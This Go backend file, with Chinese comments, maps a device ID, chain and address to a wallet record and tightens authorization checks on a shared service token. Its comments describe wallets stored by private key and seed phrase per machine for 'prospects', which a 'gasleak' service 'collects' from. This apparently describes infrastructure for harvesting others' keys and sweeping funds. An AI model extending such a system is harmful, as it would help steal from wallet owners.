// ============================================================================
// wallet 定位器（§3.5 数据同步桥）
// ============================================================================
// 背景：gasleak 侧的 DerivedAddress / CollectLog 只持有 deviceId + address，
//
//	不持有潜客的 wallet.id，而 /app/collect-* 需要 wallet_id 才能落 bill。
//	（gasleak 的 /app/wallet 只回传 error，不回传新建的 wallet id。）
//
// 为什么不能只用 device_id 定位：
//
//	InsertWallet 按 private_key / phrase 建行，一台 machine 可对应【多行】wallet，
//	device_id → wallet 是 1:N，必须叠加 chain + address 才能 1:1 命中。
//
// ============================================================================
package app

import (
	"errors"
	"fmt"
	"strings"

	"github.com/flipped-aurora/gin-vue-admin/server/model/app"
	"gorm.io/gorm"
)

// walletAddressColumns chain → 潜客 wallet 表的地址列。
// ★ 取值必须与 gasleak 的 DerivedAddress.chain 枚举对齐（['eth','tron','btc']），
// 否则按地址匹配会静默落空，回传直接失败。
var walletAddressColumns = map[string]string{
	"eth":  "eth_address",
	"bsc":  "eth_address", // BSC 与 ETH 共用同一 EVM 地址
	"tron": "trx_address",
	"trx":  "trx_address",
	"btc":  "btc_address",
}

// ResolveWalletId 优先用 wallet_id 直取；缺省时由 device_id + chain + address 反查。
func ResolveWalletId(tx *gorm.DB, walletId int, deviceId, chain, address string) (int, error) {
	if walletId > 0 {
		// ★ D0-C4：wallet_id 直传分支原为【无条件信任】——而服务间只有单一
		//   共享 token（X-Service-Token），任何持 token 者可对任意 wallet_id
		//   执行 lock / release / report。故当 device_id 与 address【均非空】
		//   时，必须交叉校验三者指向同一 wallet，与下方反查路径约束等价。
		//
		// ★ 缺省语义必须保留（硬要求）：wallet_status.go:41 是
		//   「wallet_id 与 device_id+chain+address 二选一」——两者缺省时
		//   直接返回 walletId，【不得】因缺省而拒绝，否则破坏既有调用点。
		//
		// ★ T14（R-01 收口）：原判据为 `deviceId != "" && address != ""`，
		//   即【两者均非空】才校验 ⇒ 半参数形态（只给 device_id 或只给 address）
		//   直接落到下面 return walletId, nil 而无条件放行，等价于原直取漏洞。
		//   现改为「★ 只要提供了 device_id 或 address ⇒ 它必须与 wallet_id
		//   指向同一 wallet」，按实际提供了哪个字段构造对应约束；
		//   ★ 但「wallet_id 单独」（两者皆空）仍放行 —— 契约 C-2 明确允许
		//   「wallet_id 或（device_id + chain + address）」二选一，
		//   故不得放宽成拒绝。
		if deviceId != "" || address != "" {
			// hasAddr 时 chain 必须可解析：address 的归属只能靠 wallet.<col> 判定，
			// 无 chain 则无法确定 col ⇒ 无法完成校验 ⇒ 拒绝（fail closed）。
			// device_id 归属走 machine.device_id，与 chain 无关，故单独提供 device_id 时无需 chain。
			var col string
			if address != "" {
				c, ok := walletAddressColumns[strings.ToLower(strings.TrimSpace(chain))]
				if !ok {
					// 提供了 address ⇒ 校验是必须完成的动作；chain 不支持/缺失则无法校验 ⇒ 拒绝
					return 0, fmt.Errorf("不支持的 chain: %q", chain)
				}
				col = c
			}

			// 按实际提供了哪些字段构造 WHERE，两者都有时与修复前等价。
			where := "wallet.id = ?"
			args := []any{walletId}
			if deviceId != "" {
				where += " AND machine.device_id = ?"
				args = append(args, deviceId)
			}
			if address != "" {
				where += " AND wallet." + col + " = ?"
				args = append(args, address)
			}

			var row struct{ ID int }
			if err := tx.Model(&app.Wallet{}).
				Select("wallet.id").
				Joins("left join machine on machine.id = wallet.machine_id").
				Where(where, args...).
				Limit(1).
				Find(&row).Error; err != nil {
				return 0, err
			}
			if row.ID == 0 {
				// 只回显调用方自己提供的 wallet_id，不泄漏 machine/地址等库内信息
				return 0, fmt.Errorf("wallet_id=%d 与 device_id/address 不一致", walletId)
			}
		}
		return walletId, nil
	}
	if deviceId == "" || address == "" {
		return 0, errors.New("需要 wallet_id，或同时提供 device_id 与 address")
	}
	// col 取自白名单映射，不存在 SQL 注入面
	col, ok := walletAddressColumns[strings.ToLower(strings.TrimSpace(chain))]
	if !ok {
		return 0, fmt.Errorf("不支持的 chain: %q", chain)
	}
	var row struct{ ID int }
	if err := tx.Model(&app.Wallet{}).
		Select("wallet.id").
		Joins("left join machine on machine.id = wallet.machine_id").
		Where("machine.device_id = ? AND wallet."+col+" = ?", deviceId, address).
		Limit(1).
		Find(&row).Error; err != nil {
		return 0, err
	}
	if row.ID == 0 {
		return 0, fmt.Errorf("未匹配到 wallet: device_id=%s chain=%s address=%s", deviceId, chain, address)
	}
	return row.ID, nil
}
